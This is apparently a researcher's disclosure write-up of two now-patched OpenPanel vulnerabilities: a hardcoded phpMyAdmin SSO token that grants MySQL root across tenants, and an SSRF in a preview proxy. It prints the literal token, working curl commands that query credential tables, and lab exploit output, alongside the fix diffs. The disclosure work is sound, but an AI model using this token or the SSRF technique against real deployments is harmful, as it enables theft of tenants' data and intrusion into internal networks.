*Author: [Dredsen](https://dredsen.github.io/)*

---

[OpenPanel](https://openpanel.com/) is a self-hosted web hosting control panel. The pitch is "VPS-grade isolation on shared hosting" - every customer gets their own dedicated Docker context with their own web server container, database container, PHP-FPM, private network, and storage volume. So a single OpenPanel host can run a few dozen unrelated tenants and (in theory) keep them all apart.

I spent an few hours reading the OpenPanel branch and ended up with two reportable bugs. One breaks the per-tenant promise wide open with a known token from the public source tree. The other is a textbook SSRF in a small side service the project ships in the same repo. Both are pre-auth on default configurations.

---

## What I found

### 1. Static phpMyAdmin SSO token grants MySQL root across tenants

OpenPanel provisions a per-user phpMyAdmin container for every account. The official docker-compose for that container looks like this (trimmed):

```yaml
# configuration/docker/compose/1.0/docker-compose.yml
phpmyadmin:
  image: phpmyadmin:${PMA_VERSION:-latest}
  volumes:
    - ./pma.php:/var/www/html/pma.php
    - /etc/openpanel/mysql/phpmyadmin/config.inc.php:/etc/phpmyadmin/config.inc.php:ro
  ports:
    - "${PMA_PORT}"
  environment:
    PMA_HOST: localhost
    MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
```

The interesting bit is the `pma.php` script that gets mounted in. It is the SSO entrypoint - the OpenPanel UI is supposed to redirect users through it so they don't have to type their MySQL password to open phpMyAdmin.

Here is its auth check, in full, straight from the repo:

```php
// configuration/mysql/phpmyadmin/pma.php
<?php
$fileToken = "IZs2cM1dmE2RluSrnUYH84kKBVjuhw";

require_once '/etc/phpmyadmin/config.secret.inc.php';
require_once '/etc/phpmyadmin/helpers.php';

// ... env loading ...

$providedToken = isset($_GET['token']) ? $_GET['token'] : '';

if ($providedToken === $fileToken) {
    session_set_cookie_params(0, '/', '', 0);
    session_name('OPENPANEL_PHPMYADMIN');
    session_start();

    if (isset($_ENV['MYSQL_ROOT_PASSWORD'])) {
        $_SESSION['PMA_single_signon_user']     = 'root';
        $_SESSION['PMA_single_signon_password'] = $_ENV['MYSQL_ROOT_PASSWORD'];
        $_SESSION['PMA_single_signon_host']     = $_ENV['PMA_HOST'] ?? 'mysql';
    }
    // ...
    header("Location: ./index.php?...");
}
```

The token `IZs2cM1dmE2RluSrnUYH84kKBVjuhw` is:

- the **only** thing standing between an anonymous HTTP request and a phpMyAdmin session as MySQL root inside the tenant's container,
- a fixed string committed to the public OSS repo,
- mounted into **every** user's phpMyAdmin container on **every** OpenPanel installation,
- paired with that container's own `MYSQL_ROOT_PASSWORD` env, so it grants root on **that user's** MySQL, not just a generic phpMyAdmin login.

Once the operator publishes phpMyAdmin via `opencli phpmyadmin set <domain>` (the documented way users access it), the per-tenant container is reachable as `https://<pma-domain>/<user-port>/`. Caddy strips the port from the URL and reverse-proxies to `localhost:<user-port>`, which is the user's phpMyAdmin. The flow looks something like this end-to-end:

```bash
# attacker, no panel account, doesn't matter who they are
curl -ksLc cookies.txt \
  'https://pma.lab.tld/32811/pma.php?token=IZs2cM1dmE2RluSrnUYH84kKBVjuhw'

# now reuse the SSO cookie to run arbitrary SQL as MySQL root in alice's container
curl -ks -b cookies.txt \
  'https://pma.lab.tld/32811/index.php?route=/import&server=1' \
  --data-urlencode 'token=<csrf>' \
  --data-urlencode 'db=alice_app' \
  --data-urlencode 'sql_query=SELECT user, authentication_string FROM mysql.user;'
```

To verify before writing it up I ran a minimal local lab - one MariaDB plus the official phpMyAdmin image with the two repo files baked in at the correct paths. The exploit output:

```
=== Step 1: hit pma.php with the static token from the public OSS repo ===
    token = IZs2cM1dmE2RluSrnUYH84kKBVjuhw
HTTP/1.1 302 Found
Set-Cookie: OPENPANEL_PHPMYADMIN=9c991d7f92f4f99e7efe4d1a4fdc9e13; path=/; HttpOnly
Location: ./index.php?

=== Step 2: reuse the SSO cookie to query Alice's MySQL through phpMyAdmin ===
Hits for LEAK_TAG_* in the phpMyAdmin response body:
LEAK_TAG_CONFIDENTIAL_SSN_123_45_6789

[+] CONFIRMED: static token in pma.php yielded a phpMyAdmin SSO session as MySQL root.
[+] Read Alice's internal_secrets row across the trust boundary with zero panel credentials.
```

A row seeded into "Alice's" database appeared in the response, fetched by an unauthenticated curl client. From "Mallory's" point of view (a different tenant on the same host) the attack is the same one HTTP request, then SQL as root in someone else's MySQL container. The per-tenant isolation OpenPanel markets does not survive a static, public token.

The fix is to remove the constant and read a per-container value the operator provisions at user-create time, then compare in constant time:

```diff
-$fileToken = "IZs2cM1dmE2RluSrnUYH84kKBVjuhw";
+$fileToken = getenv('PMA_SSO_TOKEN') ?: '';
+if (strlen($fileToken) < 32) {
+    // refuse SSO when the operator has not provisioned a per-container token
+    header("Location: ./index.php?loginform=true");
+    exit;
+}
@@
-if ($providedToken === $fileToken) {
+if (hash_equals($fileToken, $providedToken)) {
```

The provisioning side (`opencli/user/add.sh`) generates a random `PMA_SSO_TOKEN` per container, writes it to the user's `.env`, and hands it to the OpenPanel UI so the SSO redirect URL still works for that one user.

### 2. Preview-proxy SSRF reaches RFC1918 and cloud metadata

The same repo ships `services/proxy/` - a small Rocky Linux + Caddy + PHP service that lets a user generate a temporary subdomain on `*.openpanel.org` that proxies to a given `(domain, IP)` pair. The intended use case is "show me what mysite.com would look like if I switched DNS to 1.2.3.4" - a preview tool before committing the DNS change.

The public form looks like this (trimmed):

```php
// services/proxy/html/index.php
$ip = $_POST['ip'] ?? '';
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    exit("Error: Invalid IP.");
}
$fake_domain = $_POST['domain'] ?? '';

// ... random subdomain generation ...
$configContent = sprintf("<?php\n\$domen = %s;\n\$ip = %s;\n",
                         var_export($fake_domain, true),
                         var_export($ip, true));
file_put_contents("/var/www/html/domains/$subdomainPart/config.php", $configContent);
redirectToSubdomain($subdomainPart, $rootDomain);
```

When the new subdomain is then visited, the per-subdomain `virt/index.php` runs the actual proxy:

```php
// services/proxy/html/virt/index.php
include 'config.php';            // $ip and $domen, attacker-controlled

if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    http_response_code(400);
    die('Invalid IP address format: ' . htmlspecialchars($ip));
}

$targetUrl = $scheme . $domen . $requestUri;
$ch = curl_init($targetUrl);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['X-Forwarded-For: ' . $ip]);
curl_setopt($ch, CURLOPT_RESOLVE, ["$domainOnly:80:$ip"]);  // pin Host -> $ip
$response = curl_exec($ch);
// ...
echo $response;
```

Both validators do `filter_var($ip, FILTER_VALIDATE_IP)` - syntactic check only. The flags that PHP exposes for exactly this situation - `FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE` - are not passed. So `127.0.0.1`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.169.254`, IPv6 ULA - all valid as far as the filter is concerned. The proxy then dutifully curls port 80 on whichever one the attacker picked, with `Host` forced to whatever they typed in `domain`, and echoes the response body back.

End-to-end, against my lab stack (proxy container plus an internal `nginx:alpine` pinned to `10.99.0.50` inside an RFC1918 docker network):

```
=== Sanity: 10.99.0.50 (RFC1918) is NOT routable from the host ===
Direct: HTTP 000

=== Step 1: POST SSRF target (ip=10.99.0.50, domain=secret.lab) to /index.php ===
HTTP/1.1 302 Found
Location: https://63f7c.openpanel.org

=== Step 2: hit the new subdomain - proxy curls 10.99.0.50:80 internally ===
Response body (first 8 lines):
SECRET-FLAG-LEAKED-internal-only

[+] SSRF CONFIRMED - the public-facing proxy fetched 10.99.0.50 (RFC1918) and returned its body.
```

The internal nginx is unreachable from the attacker's host (Step 1's `HTTP 000` confirms that). The proxy fetches it on the attacker's behalf and pipes the body back over the public preview subdomain. For a real-world deployment that's IMDSv1 on port 80 from a cloud host, internal admin panels in the same VPC, services bound to loopback, take your pick.

The fix is a one-line addition at both validator sites:

```diff
-if (!filter_var($ip, FILTER_VALIDATE_IP)) {
+if (!filter_var($ip, FILTER_VALIDATE_IP,
+                FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
     http_response_code(400);
     die('Invalid IP address format: ' . htmlspecialchars($ip));
 }
```

---

## Disclosure

Both were reported privately to OpenPanel via the contact in their `SECURITY.md`. The maintainer patched them and shipped fixed releases within the hour. Thanks to [stefanpejcic](https://github.com/stefanpejcic) for being responsive and turning fixes around. [In-depth advisories on the OpenPanel security tab](https://github.com/stefanpejcic/OpenPanel/security).
